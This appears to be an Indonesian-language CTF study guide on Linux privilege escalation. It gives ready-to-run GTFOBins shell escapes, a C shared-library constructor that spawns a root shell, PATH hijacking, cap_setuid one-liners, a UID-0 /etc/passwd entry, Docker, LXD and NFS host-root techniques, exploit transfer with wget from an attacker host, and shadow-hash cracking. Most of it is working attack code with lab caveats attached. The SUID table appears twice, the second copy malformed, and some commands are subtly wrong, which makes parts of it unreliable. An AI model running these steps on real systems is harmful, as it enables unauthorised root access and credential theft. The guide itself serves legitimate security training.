# 3.2 🔥 Apa itu GTFOBins?

GTFOBins adalah referensi teknik untuk binary Unix yang dapat disalahgunakan ketika binary tersebut diberikan privilege tertentu.

Gunakan untuk:

```text
Identify binary
      ↓
Search GTFOBins
      ↓
Check Sudo/SUID/Command
      ↓
Adapt command
      ↓
Validate
```

Website:

```text
https://gtfobins.github.io/
```

Offline copy mungkin tersedia di beberapa distro/lab, misalnya:

```bash
# Cari package/reference lokal jika tersedia
find /usr/share -iname '*gtfo*' 2>/dev/null
```

Jangan mengasumsikan `/usr/share/gtfobins/` selalu ada.

---

# 3.3 📚 GTFOBins Common CTF Reference

> **Penting:** Hanya berlaku apabila binary tersebut memang diberikan privilege yang memungkinkan teknik tersebut.  
> Command di bawah bukan “password universal” untuk semua binary.

|Binary|Teknik|Exact Command|
|---|---|---|
|`bash`|`bash -p`|`bash -p`|
|`find`|`find . -exec /bin/bash -p \\; -quit`|`find . -exec /bin/bash -p \\; -quit`|
|`vim`|shell escape / interpreter|`sudo vim -c ':set shell=/bin/sh' -c ':shell'`|
|`python`|`setuid(0)` atau exec shell jika capability/SUID context memungkinkan|`python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`|
|`perl`|UID manipulation / exec|`perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'`|
|`awk`|execute command|`awk 'BEGIN {system("/bin/sh")}'`|
|`less`|shell escape|`less /etc/passwd && !q` then `!sh`|
|`more`|shell escape|`more /etc/passwd && !q` then `!sh`|
|`man`|pager escape|`man ls && !q` then `!sh`|
|`env`|execute command|`env /bin/sh -c "sh"`|
|`cp`|privileged file copy|`cp /etc/passwd /tmp/ && /bin/sh`|
|`tee`|privileged file write|`tee /tmp/root.txt <<< 'root:$6$hash:0:0:root:/root:/bin/bash'`|
|`cat`|privileged file read|`cat /etc/shadow`|
|`dd`|privileged file read/write|`dd if=/etc/passwd of=/tmp/root`|
|`base64`|privileged file read|`base64 /etc/passwd`|
|`nano`|privileged file editing|`sudo nano && Ctrl+R Ctrl+X -> type: reset; sh 1>&0 2>&0`|
|`xxd`|privileged file read/write patterns|`xxd -p /etc/passwd`|
|`screen`|command execution depending on version/config|`screen -X stuff "!/bin/sh\n"`|
|`nmap`|legacy interactive mode on affected versions|`nmap --interactive` then `!sh`|

---

# 3.4 🌟 Sudo Wildcard

Misconfiguration:

```text
(root) NOPASSWD: /usr/bin/tar -czf /backup/a.tar.gz *
```

Potential issue:

```text
*
 ↓
shell expansion
 ↓
attacker-controlled filenames
 ↓
filenames may become options
```

Namun:

```text
Wildcard ≠ automatically vulnerable
```

Harus memeriksa:

```bash
# Lihat sudo rule
sudo -l

# Cek directory
ls -la /backup

# Cek apakah argument path dapat dikontrol
pwd
```

---

# 3.5 🧪 Sudo Environment Variables

Cari:

```bash
# Lihat environment-related sudo configuration
sudo -l
```

Yang menarik misalnya:

```text
env_keep+=LD_PRELOAD
```

Tetapi jangan menganggap `LD_PRELOAD` otomatis tersedia.

Modern `sudo` sering membersihkan dangerous environment variables.

---

## Conceptual LD_PRELOAD test

Source:

```bash
# Buat library contoh
cat > /tmp/preload.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
```

Compile:

```bash
# Compile shared object
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c
```

Jalankan hanya jika policy sudo memang memungkinkan:

```bash
# Contoh generic
sudo LD_PRELOAD=/tmp/preload.so /path/to/allowed/binary
```

Kenapa bekerja?

```text
Dynamic linker
      ↓
memuat shared library
      ↓
constructor dijalankan
      ↓
code execution terjadi
      ↓
jika binary berjalan dengan privilege tinggi
      ↓
payload memperoleh privilege tersebut
```

---

# ⚙️ BAGIAN 4 — SUID / SGID ABUSE

# 4.1 🧠 Konsep SUID

SUID:

```text
Set User ID
```

Jika binary milik root memiliki SUID:

```text
-rwsr-xr-x root root /path/to/binary
```

maka program dapat menjalankan operasi dengan **effective UID owner** sesuai desain program.

---

## Analogi

```text
Normal binary:
kita → privilege kita

SUID root binary:
kita → program berjalan dengan EUID root
```

SUID bukan:

```text
"Semua user otomatis menjadi root"
```

Yang benar:

```text
Program tersebut
+
cara program menggunakan privilege
=
apakah dapat dieksploitasi?
```

---

# 4.2 🔎 Membaca permission

```text
-rwsr-xr-x
    ↑
    SUID
```

Huruf:

```text
s
```

berarti:

```text
execute + SUID
```

Sedangkan:

```text
S
```

berarti bit SUID aktif tetapi execute owner bit tidak aktif.

---

# 4.3 🔍 Enumerasi SUID

```bash
# Cari semua SUID binary
find / -perm -4000 -type f 2>/dev/null
```

Dengan detail:

```bash
# Tampilkan permission dan owner
find / -perm -4000 -type f 2>/dev/null \
  -exec ls -la {} \;
```

SUID + SGID:

```bash
# Cari SUID atau SGID
find / \( -perm -4000 -o -perm -2000 \) \
  -type f 2>/dev/null
```
```text
/usr/bin/mount         ← normal, skip
/usr/bin/passwd        ← normal, skip
/usr/bin/sudo          ← normal, skip
/usr/local/bin/backup  ← NOT STANDARD, investigate!
/opt/service/runner    ← NOT STANDARD, investigate!
```
---

# 4.4 📚 Common SUID Candidates

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
```

Jangan hanya melihat:

```text
"Binary ada SUID"
```

Pertanyaan sebenarnya:

```text
Apakah binary standard?
Apakah version vulnerable?
Apakah GTFOBins relevan?
Apakah custom implementation?
Apakah binary memanggil executable lain?
Apakah binary membaca file yang bisa kita kontrol?
```

---

# 4.5 💥 GTFOBins via SUID

|Binary|Teknik|Exact Command|
|---|---|---|
|`bash`|`bash -p`|`bash -p`|
|`find`|`find . -exec /bin/bash -p \\; -quit`|`find . -exec /bin/bash -p \\; -quit`|
|`vim`|shell escape / interpreter|`sudo vim -c ':set shell=/bin/sh' -c ':shell'`|
|`python`|`setuid(0)` atau exec shell jika capability/SUID context memungkinkan|`python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`|
|`perl`|UID manipulation / exec|`perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'`|
|`awk`|execute command|`awk 'BEGIN {system("/bin/sh")}'`|
|`less`|shell escape|`less /etc/passwd && !q` then `!sh`|
|`more`|shell escape|`more /etc/passwd && !q` then `!sh`|
|`man`|pager escape|`man ls && !q` then `!sh`|
|`env`|execute command|`env /bin/sh -c "sh"`|
|`cp`|privileged file copy|`cp /etc/passwd /tmp/ && /bin/sh`|
|`tee`|privileged file write|`tee /tmp/root.txt <<< 'root:$6$hash:0:0:root:/root:/bin/bash'`|
|`cat`|privileged file read|`cat /etc/shadow`|
|`dd`|privileged file read/write|`dd if=/etc/passwd of=/tmp/root`|
|`base64`|privileged file read|`base64 /etc/passwd`|
|`nano`|privileged file editing|`sudo nano && Ctrl+R Ctrl+X -> type: reset; sh 1>&0 2>&0`|
|`xxd`|privileged file read/write patterns|`xxd -p /etc/passwd`|
|`screen`|command execution depending on version/config|`screen -X stuff "!/bin/sh\n"`|
|`nmap`|legacy interactive mode on affected versions|`nmap --interactive` then `!sh`|
|---|---|
|`bash`|`bash -p`|
|`find`|`find . -exec /bin/bash -p \; -quit`|
|`vim`|shell escape / interpreter|
|`python`|`setuid(0)` atau exec shell jika capability/SUID context memungkinkan|
|`perl`|UID manipulation / exec|
|`awk`|execute command|
|`less`|shell escape|
|`more`|shell escape|
|`man`|pager escape|
|`env`|execute command|
|`cp`|privileged file copy|
|`tee`|privileged file write|
|`cat`|privileged file read|
|`dd`|privileged file read/write|
|`base64`|privileged file read|
|`nano`|privileged file editing|
|`xxd`|privileged file read/write patterns|
|`screen`|command execution depending on version/config|
|`nmap`|legacy interactive mode on affected versions|

**Peringatan penting:**

Binary SUID modern dapat berperilaku berbeda dari contoh lama di internet. Selalu cocokkan:

```text
binary
+
version
+
actual permission
+
actual execution behavior
```

---

# 4.6 🧪 Custom SUID Binary

Jika menemukan:

```bash
ls -la /usr/local/bin/custom_binary
```

Contoh:

```text
-rwsr-xr-x 1 root root 16832 Jan 15 10:00 /usr/local/bin/custom_binary
```

Mulai analisis.

---

## File type

```bash
# Identifikasi binary
file /usr/local/bin/custom_binary
```

---

## Strings

```bash
# Cari string menarik
strings /usr/local/bin/custom_binary
```

Cari:

```text
system
exec
popen
/bin/sh
/bin/bash
python
tar
cp
service
```

---

## ltrace

```bash
# Trace library calls
ltrace /usr/local/bin/custom_binary 2>&1
```

---

## strace

```bash
# Trace system calls
strace /usr/local/bin/custom_binary 2>&1
```

---

# 4.7 🛣️ PATH Hijacking via SUID

Misalnya:

```text
strings:
service apache2 start
```

Problem:

```text
service
```

bukan:

```text
/usr/sbin/service
```

Program mungkin melakukan PATH lookup.

---

## Cek PATH

```bash
echo "$PATH"
```

Buat malicious command:

```bash
# Buat fake "service"
cat > /tmp/service <<'EOF'
#!/bin/bash
/bin/bash -p
EOF

# Jadikan executable
chmod +x /tmp/service
```

Inject:

```bash
# Prioritaskan /tmp
export PATH=/tmp:$PATH
```

Jalankan:

```bash
# Jalankan SUID binary
/usr/local/bin/custom_binary
```

Verifikasi:

```bash
id
```

---

# 🧩 BAGIAN 5 — LINUX CAPABILITIES

# 5.1 🧠 Apa itu Capabilities?

Linux capabilities memecah kekuasaan root menjadi privilege yang lebih granular.

Contoh:

```text
SUID root
=
large privilege boundary
```

Sedangkan:

```text
cap_setuid
=
kemampuan mengubah UID
```

Karena itu:

```text
Capability tertentu
+
binary tertentu
=
PrivEsc
```

Tetapi capability harus dilihat bersama:

```text
capability
+
binary
+
implementation
+
effective/permitted state
```

---

# 5.2 🚨 Capabilities yang Menarik

|Capability|Makna umum|Mengapa menarik|
|---|---|---|
|`cap_setuid`|Mengubah UID|Potensi menjadi UID 0|
|`cap_setgid`|Mengubah GID|Memengaruhi group privilege|
|`cap_dac_override`|Bypass DAC checks|Dapat melewati sebagian permission check|
|`cap_dac_read_search`|Bypass read/search permission|Pembacaan file sensitif|
|`cap_sys_admin`|Banyak operasi administratif|Sangat powerful|
|`cap_sys_ptrace`|Trace process|Potensi interaksi dengan process privileged|
|`cap_chown`|Mengubah ownership|Dapat memanipulasi file|
|`cap_fowner`|Bypass ownership-related checks|Memengaruhi permission operations|
|`cap_net_raw`|Raw sockets|Network-related operations|

---

# 5.3 🔎 Enumerate

```bash
# Cari capabilities pada seluruh filesystem
getcap -r / 2>/dev/null
```

Contoh:

```text
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

Penting:

```text
=ep
```

berarti capability ada dalam:

```text
effective
permitted
```

context.

---

# 5.4 💥 cap_setuid

Misalnya:

```text
/usr/bin/python3 = cap_setuid+ep
```

Concept:

```text
Python
 ↓
setuid(0)
 ↓
effective UID = 0
```

Contoh:

```bash
# Ubah effective UID ke 0
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verifikasi:

```bash
id
```

Jika:

```text
uid=0(root)
```

berarti berhasil.

---

## Perl

```bash
# Perl dengan cap_setuid
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
```

---

## Ruby

```bash
# Ruby dengan cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

## Node.js

```bash
# Node dengan kemampuan setuid
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio:[0,1,2]})'
```

---

## Vim

Hanya jika capability dan build Vim mendukung mekanisme yang digunakan:

```bash
# Contoh pendekatan Python interface
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash")'
```

Jangan menganggap semua build Vim mendukung `:py3`.

---

# 5.5 📖 cap_dac_read_search

Kemampuan ini dapat membantu bypass permission checks tertentu.

Misalnya capability ditemukan pada tool file-oriented.

Namun:

```text
cap_dac_read_search
≠ automatically root shell
```

Sering kali impact terbaik adalah:

```text
read sensitive files
   ↓
credentials
   ↓
account takeover
   ↓
sudo/root
```

---

# 🕐 BAGIAN 6 — CRON EXPLOITATION DETAIL

Workflow:

```text
Find scheduled task
      ↓
Who executes?
      ↓
What executes?
      ↓
Can we control it?
      ↓
Can we control dependency?
      ↓
Can we control PATH?
      ↓
Can we control arguments?
      ↓
Privilege escalation
```

---

# 6.1 🔥 Writable Cron Script

Cari:

```bash
# Cron
cat /etc/crontab

# Permission target script
ls -la /path/to/cronjob.sh
```

Jika:

```text
root executes
+
attacker writes
```

maka candidate kuat.

---

# 6.2 🐍 Writable Python Module

Contoh:

```text
root cron
 ↓
/opt/backup.py
 ↓
import utils
 ↓
/usr/local/lib/utils.py
```

Jika `utils.py` writable:

```text
root trusted Python script
        ↓
attacker-controlled import
        ↓
arbitrary code execution
        ↓
root
```

---

# 6.3 🛣️ Cron PATH Injection

Pertanyaan:

```text
Apakah command menggunakan absolute path?
```

Bandingkan:

```text
/bin/bash
```

vs:

```text
bash
```

Yang kedua dapat memerlukan PATH lookup.

---

# 6.4 🎯 Cron Wildcard

Checklist:

```text
[ ] wildcard digunakan
[ ] shell melakukan expansion
[ ] attacker mengontrol directory
[ ] attacker dapat membuat filename
[ ] filename diperlakukan sebagai option
[ ] command tidak menggunakan `--`
```

Defensive pattern:

```bash
tar ... -- /var/www/*
```

bisa mengurangi beberapa kelas option parsing, tetapi implementasi command tetap harus diperiksa.

---

# 📂 BAGIAN 7 — WRITABLE FILES & PATH HIJACKING

# 7.1 🔥 Writable `/etc/passwd`

Cek:

```bash
# Permission
ls -la /etc/passwd
```

Jika writable:

```text
重大 security issue
```

Karena `/etc/passwd` menyimpan field:

```text
username:password:UID:GID:GECOS:home:shell
```

UID:

```text
0
```

berarti superuser identity.

---

## Jangan langsung merusak `/etc/passwd`

Untuk lab, sebuah entri user dengan UID 0 dapat menunjukkan impact.

Contoh membuat hash:

```bash
# Generate password hash (SHA‑512)
openssl passwd -6 -salt randomsalt 'password123'
```

**Format options:**
- SHA‑512 (modern, recommended): `openssl passwd -6 -salt <salt> <password>`
- MD5 (legacy): `openssl passwd -1 -salt <salt> <password>`
- Auto‑generated salt: `openssl passwd -6 <password>`

**Example output:**
```text
$6$randomsalt$Kj1vZp8uJH2hK9r... (hash)
```

**Conceptual /etc/passwd line:**
```text
hacker:$6$randomsalt$Kj1vZp8uJH2hK9r...:0:0:hacker:/root:/bin/bash
```

Kemudian validasi:

```bash
# Verifikasi entry
grep '^hacker:' /etc/passwd
```

Masuk:

```bash
# Switch user
su hacker
```

Tetapi pada system modern:

- `/etc/shadow`
    
- PAM
    
- login restrictions
    
- SELinux/AppArmor
    
- filesystem behavior
    

dapat memengaruhi hasil.

Karena itu jangan menghafal:

```text
"Tambah UID 0 = pasti login"
```

---

# 7.2 🛣️ PATH Hijacking

Konsep:

```text
Vulnerable program
      ↓
calls "cat"
      ↓
OS searches PATH
      ↓
attacker-controlled /tmp/cat found first
      ↓
attacker code executes
```

---

## Check PATH

```bash
# Lihat PATH
echo "$PATH"
```

Buat fake executable:

```bash
# Fake cat
cat > /tmp/cat <<'EOF'
#!/bin/bash
/bin/bash -p
EOF

# Jadikan executable
chmod +x /tmp/cat
```

Inject:

```bash
# Taruh /tmp di depan PATH
export PATH=/tmp:$PATH
```

Jalankan vulnerable program:

```bash
# Contoh
/usr/local/bin/vulnerable_suid
```

---

# 📚 BAGIAN 8 — SHARED LIBRARY HIJACKING

# 8.1 🔬 `ldd`

```bash
# Tampilkan shared libraries
ldd /usr/local/bin/vulnerable_binary
```

Contoh:

```text
libsomething.so => not found
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

`not found` menarik.

Namun harus dicek:

```text
Di mana library dicari?
Apakah directory writable?
Apakah binary privileged?
Apakah loader mengabaikan environment tertentu?
```

---

# 8.2 🔎 Library Search Paths

```bash
# Dynamic loader configuration
cat /etc/ld.so.conf 2>/dev/null

# Include files
cat /etc/ld.so.conf.d/* 2>/dev/null
```

---

# 8.3 💥 Constructor Hijacking

Contoh lab:

```bash
# Buat source
cat > /tmp/malicious.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
```

Compile:

```bash
# Compile shared library
gcc -shared -fPIC \
  -o /tmp/libmissing.so \
  /tmp/malicious.c
```

Kemudian jika target directory yang diperlukan writable:

```bash
# Copy library ke path yang dicari binary
cp /tmp/libmissing.so /usr/local/lib/
```

Jalankan:

```bash
# Jalankan vulnerable binary
/usr/local/bin/vulnerable_binary
```

Verifikasi:

```bash
id
```

### Kenapa works?

```text
Privileged binary
      ↓
Dynamic loader
      ↓
Load attacker-controlled library
      ↓
constructor otomatis dipanggil
      ↓
arbitrary code
      ↓
privileged context
```

---

# 🌐 BAGIAN 9 — NFS MISCONFIGURATION

# 9.1 🧠 Konsep `root_squash`

NFS biasanya memakai:

```text
root_squash
```

Artinya root client tidak otomatis diperlakukan sebagai root server.

Konfigurasi:

```text
no_root_squash
```

menghapus perlindungan tersebut.

Potensi:

```text
Root di attacker
      ↓
Mount NFS
      ↓
Buat file owned root
      ↓
File terlihat root pada server
```

---

# 9.2 🔎 Enumerate

Target:

```bash
# Lihat NFS exports
cat /etc/exports
```

Contoh berbahaya:

```text
/var/nfs/share *(rw,no_root_squash)
```

---

# 9.3 💥 Exploit NFS

Attacker yang benar-benar memiliki root pada mesin NFS client:

```bash
# Buat mount point
mkdir -p /tmp/nfs_mount

# Mount NFS share
mount -t nfs $TARGET:/var/nfs/share /tmp/nfs_mount
```

Buat privileged file:

```bash
# Copy bash
cp /bin/bash /tmp/nfs_mount/rootbash

# Set SUID
chmod 4755 /tmp/nfs_mount/rootbash
```

Di target:

```bash
# Cek file
ls -la /var/nfs/share/rootbash
```

Kemudian:

```bash
# Jalankan SUID bash
/var/nfs/share/rootbash -p
```

Verifikasi:

```bash
id
```

### Catatan penting

Skenario ini bergantung pada:

```text
export configuration
+
filesystem
+
UID mapping
+
client privileges
+
NFS version
```

Jadi:

```text
no_root_squash
```

adalah **indikator kuat**, bukan tombol otomatis.

---

# 🐳 BAGIAN 10 — DOCKER & LXD

# 10.1 🐳 Docker Group

Cek:

```bash
# Apakah kita berada di docker group?
id
```

atau:

```bash
groups | grep docker
```

Jika user memiliki akses ke Docker daemon, terutama socket root-owned:

```text
docker privilege
      ↓
container runs with high host interaction
      ↓
host filesystem exposed
      ↓
potential root-equivalent host access
```

---

## Method 1 — Mount host root

```bash
# Check available images
docker images --format "{{.Repository}}:{{.Tag}}"

# Use available image (fallback to busybox if alpine missing)
IMAGE=${IMAGE:-$(docker images --format "{{.Repository}}:{{.Tag}}" | grep -E 'alpine|busybox' | head -n1)}

docker run --rm -it \
  -v /:/mnt \
  $IMAGE \
  chroot /mnt /bin/sh
```

Konsep:

```text
-v /:/mnt
```

berarti:

```text
host /
 ↓
container /mnt
```

Kemudian:

```text
chroot /mnt
```

berarti shell bekerja pada host filesystem sebagai root dalam container context.

---

## Method 2 — SUID bash

```bash
# Copy host bash ke /tmp
docker run --rm \
  -v /:/mnt \
  alpine \
  cp /mnt/bin/bash /mnt/tmp/rootbash
```

Kemudian:

```bash
# Set SUID
docker run --rm \
  -v /:/mnt \
  alpine \
  chmod 4755 /mnt/tmp/rootbash
```

Host:

```bash
# Jalankan
/tmp/rootbash -p
```

---

## Method 3 — Read sensitive file

```bash
# Baca shadow host
docker run --rm \
  -v /:/mnt \
  alpine \
  cat /mnt/etc/shadow
```

---

## Existing images

```bash
# Lihat images
docker images
```

Gunakan image yang memang tersedia bila environment offline.

---

# 10.2 🦎 LXD / LXC Group

Cek:

```bash
# Cek group
id | grep -E 'lxd|lxc'
```

Pada sistem tertentu, akses LXD daemon dapat memberikan root-equivalent access ke host.

---

## Konsep

```text
User
 ↓
LXD daemon access
 ↓
Privileged container
 ↓
Host filesystem mount
 ↓
Host root access
```

---

## Builder

Lab tradisional sering menggunakan builder:

```bash
# NOTE: lxd-alpine-builder is deprecated.
# Modern approach: use existing LXD images.
# List available images
lxc image list
# Or copy a known image
lxc image copy ubuntu:20.04 local: --alias ubuntu
```

Masuk:

```bash
# Masuk ke builder
cd lxd-alpine-builder
```

Build:

```bash
# Jalankan builder
sudo ./build-alpine
```

Kemudian transfer tarball ke target.

---

## Import

```bash
# Import image
lxc image import alpine.tar.gz --alias privesc
```

---

## Create privileged container

```bash
# Buat container privileged
lxc init privesc pwn -c security.privileged=true
```

Tambah host root:

```bash
# Mount host /
lxc config device add pwn hostroot disk \
  source=/ \
  path=/mnt/root \
  recursive=true
```

Start:

```bash
# Start container
lxc start pwn
```

Exec:

```bash
# Masuk container
lxc exec pwn /bin/sh
```

Kemudian:

```bash
# Masuk ke host filesystem
chroot /mnt/root /bin/bash
```

Verifikasi:

```bash
id
```

---

# 🧨 BAGIAN 11 — KERNEL EXPLOITATION

# 11.1 ⚠️ Kernel Exploit = Last Resort

Kernel exploit sering menjadi pilihan terakhir.

Alasannya:

```text
Userland misconfiguration
       ↓
lebih predictable

Kernel exploit
       ↓
system-wide impact
       ↓
lebih berisiko crash
```

Urutan yang lebih baik:

```text
sudo
SUID
Capabilities
Cron
Credentials
Writable files
Services
Docker/LXD
NFS
PATH/library
        ↓
Kernel exploit
```

---

# 11.2 🔍 Identifikasi Kernel

```bash
# Kernel release
uname -r

# Full information
uname -a

# Distro
cat /etc/os-release

# Installed kernel packages
dpkg -l 'linux-*' 2>/dev/null | grep '^ii'
```

---

## Contoh

```text
Linux victim 5.4.0-42-generic
```

Jangan hanya:

```text
5.4 = vulnerable
```

Tetapi:

```text
5.4.0-42-generic
+
Ubuntu
+
release
+
patches
+
architecture
```

---

# 11.3 🧪 Linux Exploit Suggester

Download:

```bash
# Download LES
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh \
  -O /tmp/les.sh

# Jadikan executable
chmod +x /tmp/les.sh
```

Run:

```bash
# Jalankan
/tmp/les.sh
```

Manual kernel:

```bash
# Berikan versi kernel
/tmp/les.sh --uname "5.4.0-42-generic"
```

Filter:

```bash
# Cari hasil highly probable
/tmp/les.sh | grep -i -A3 "highly probable"
```

---

# 11.4 📋 Common Linux LPE CVE Classes

|CVE|Nama|Catatan|
|---|---|---|
|CVE-2016-5195|Dirty COW|Linux kernel race condition; historical|
|CVE-2021-3156|Baron Samedit|Sudo heap-based overflow|
|CVE-2021-4034|PwnKit|Polkit `pkexec` LPE|
|CVE-2022-0847|Dirty Pipe|Page cache vulnerability|
|CVE-2023-0386|OverlayFS|OverlayFS privilege escalation|
|CVE-2021-3493|OverlayFS|Ubuntu-specific historical issue|
|CVE-2022-2588|Route of Dead / FIB issue|Kernel-specific conditions|
|CVE-2016-1531|Exim|Service/software-specific rather than generic kernel LPE|

### Prinsip:

```text
CVE found
   ↓
Confirm product
   ↓
Confirm exact version
   ↓
Confirm distro
   ↓
Confirm affected range
   ↓
Find PoC
   ↓
Read code
   ↓
Compile
   ↓
Run in lab
```

---

# 11.5 💣 SearchSploit

```bash
# Cari exploit lokal
searchsploit dirty pipe
```

Copy exploit:

```bash
# Contoh: copy exploit ke current directory
searchsploit -m <EDB-ID>
```

Transfer:

```bash
# Jalankan HTTP server
python3 -m http.server 8080
```

Target:

```bash
# Download source
wget http://$LHOST:8080/exploit.c -O /tmp/exploit.c
```

Compile:

```bash
# Compile
gcc /tmp/exploit.c -o /tmp/exploit
```

Run:

```bash
# Execute exploit
/tmp/exploit
```

### Jangan percaya source exploit hanya karena:

```text
"Exploit for CVE-X"
```

Baca:

```bash
# Baca source dahulu
less /tmp/exploit.c
```

Periksa:

```text
Apa yang diubah?
File mana yang disentuh?
Apakah membutuhkan reboot?
Apakah membuat process?
Apakah memodifikasi kernel state?
Apakah ada cleanup?
```

---

# 🔑 BAGIAN 12 — CREDENTIAL REUSE

Credential yang ditemukan sering menjadi jalur paling bersih.

Misalnya:

```text
/var/www/.env
     ↓
DB password
     ↓
password reuse
     ↓
SSH user
     ↓
sudo -l
     ↓
root
```

---

# 12.1 👥 Enumerate users

```bash
# Buat daftar user dengan shell
cat /etc/passwd | \
  grep -vE '(nologin|false)' | \
  cut -d: -f1
```

---

# 12.2 🔐 Test password reuse

Di CTF:

```bash
# Switch user secara manual
su username
```

SSH lokal:

```bash
# Test credential terhadap localhost
ssh username@127.0.0.1
```

Jika SSH menggunakan port lain:

```bash
# Specify port
ssh -p 22 username@127.0.0.1
```

Jangan melakukan password spraying pada sistem yang tidak secara eksplisit mengizinkannya.

---

# 12.3 🧂 `/etc/shadow`

Jika dapat dibaca:

```bash
# Cek permission
ls -la /etc/shadow
```

Dalam lab:

```bash
# Simpan shadow
cat /etc/shadow > /tmp/shadow.txt
```

Cracking dilakukan di attacker.

Jika memiliki:

```text
/etc/passwd
/etc/shadow
```

gunakan `unshadow`:

```bash
# Gabungkan file untuk John
unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/combined.txt
```

John:

```bash
# Crack dengan wordlist
john /tmp/combined.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

Untuk Hashcat:

```bash
# Pastikan mode hash sesuai algoritma shadow
hashcat -m <MODE> /tmp/hash.txt \
  /usr/share/wordlists/rockyou.txt
```

Jangan menghafal `-m 1800` sebagai:

```text
"semua Linux shadow"
```

Mode Hashcat bergantung pada algoritma hash yang benar-benar ditemukan.

---

# 🌳 BAGIAN 13 — DECISION TREE LINUX PRIVESC

```text
┌─────────────────────────────────────────────┐
│ LOW PRIV SHELL — MULAI DARI SINI            │
└──────────────────────┬──────────────────────┘
                       │
                       ▼
             ┌───────────────────┐
             │ STABILISASI SHELL  │
             └─────────┬─────────┘
                       │
                       ▼
             ┌───────────────────┐
             │ id / whoami       │
             │ sudo -l           │
             │ groups            │
             └─────────┬─────────┘
                       │
                       ▼
              ┌────────────────┐
              │ RUN LINPEAS     │
              └───────┬────────┘
                      │
          ┌───────────┴─────────────┐
          │                         │
          ▼                         ▼
   [OBVIOUS FINDING]        [NOTHING OBVIOUS]
          │                         │
          ▼                         ▼
   MANUAL VALIDATION        MANUAL ENUMERATION
                                    │
               ┌────────────────────┼────────────────────┐
               │                    │                    │
               ▼                    ▼                    ▼
            [SUDO]                [SUID]              [CAPS]
          sudo -l           find / -perm 4000    getcap -r /
               │                    │                    │
               ▼                    ▼                    ▼
           GTFOBins             GTFOBins          cap_setuid?
               │                    │                    │
               └──────────────┬─────┴────────────────────┘
                              │
                              ▼
                          [CRON?]
                              │
                              ▼
                         pspy / crontab
                              │
                              ▼
                        Writable script?
                              │
                     ┌────────┴────────┐
                     │                 │
                     ▼                 ▼
                    YES                NO
                     │                 │
                     ▼                 ▼
                 Payload          inspect PATH
                                      │
                                      ▼
                                  [CREDS?]
                                      │
                                      ▼
                              history / .env /
                              config / SSH
                                      │
                                      ▼
                              Password reuse?
                                      │
                           ┌──────────┴──────────┐
                           │                     │
                          YES                    NO
                           │                     │
                           ▼                     ▼
                        su/SSH              [SERVICES?]
                                                 │
                                                 ▼
                                           root service?
                                                 │
                                                 ▼
                                         writable binary?
                                                 │
                                          ┌──────┴──────┐
                                          │             │
                                          ▼             ▼
                                       PATH         LIBRARY
                                       hijack        hijack
                                          │             │
                                          └──────┬──────┘
                                                 │
                                                 ▼
                                        [SPECIAL GROUPS?]
                                                 │
                               ┌─────────────────┼────────────────┐
                               │                 │                │
                               ▼                 ▼                ▼
                            docker             lxd              disk
                               │                 │                │
                               └─────────────────┴────────────────┘
                                                 │
                                                 ▼
                                         [NFS MISCONFIG?]
                                                 │
                                                 ▼
                                           no_root_squash
                                                 │
                                                 ▼
                                       [KERNEL — LAST RESORT]
                                                 │
                                                 ▼
                                        uname -a + LES
                                                 │
                                                 ▼
                                          CVE validation
                                                 │
                                                 ▼
                                          ROOT SHELL
                                                 │
                                                 ▼
                                          /root/root.txt
```

---

# ⚡ 30-SECOND PRIVESC TRIAGE

Saat mendapatkan shell:

```bash
# Identity
id

# Sudo
sudo -l
**Note:** An entry like `(root) NOPASSWD: /usr/bin/python3 /opt/monitor.py` only permits running **that exact script** with sudo, not any `python3` command. Verify the script is writable before attempting to abuse it.
# Groups
groups

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab

# Listening services
ss -lntup

# Kernel
uname -a
```

Kemudian:

```text
SUDO?
 ↓
SUID?
 ↓
CAPABILITY?
 ↓
CRON?
 ↓
CREDENTIAL?
 ↓
WRITABLE FILE?
 ↓
DOCKER/LXD?
 ↓
NFS?
 ↓
PATH/LIBRARY?
 ↓
KERNEL?
```

---

# 🧯 BAGIAN 14 — COMMON ERRORS & TROUBLESHOOTING

|Error / Situasi|Penyebab kemungkinan|Solusi|
|---|---|---|
|`sudo -l: Sorry, user may not run sudo`|Tidak ada sudo privilege|Cari vector lain|
|`sudo: no tty present`|Shell tidak memiliki TTY|Upgrade PTY|
|SUID binary tidak menghasilkan root|Binary tidak exploitable / environment berbeda|Analisis binary|
|`gcc: command not found`|Compiler tidak tersedia|Compile di attacker dengan arsitektur yang sama|
|`/tmp` `noexec`|Filesystem melarang execution|Gunakan writable executable location lain yang memang tersedia|
|LinPEAS tidak dapat download|Internet disabled|Transfer dari attacker|
|Shell mati saat Ctrl+C|Shell belum interactive|Upgrade PTY|
|`nc: invalid option -e`|Netcat implementation tidak mendukung `-e`|Gunakan bash `/dev/tcp` atau listener tanpa `-e`|
|Cron payload tidak jalan|Wrong timing/path/permission|Verifikasi dengan pspy|
|Cron script tidak writable|Permission salah|Cari dependency/PATH/wildcard|
|`ltrace` tidak tersedia|Package tidak terinstall|Gunakan `strace`, `strings`, `file`, atau transfer tool|
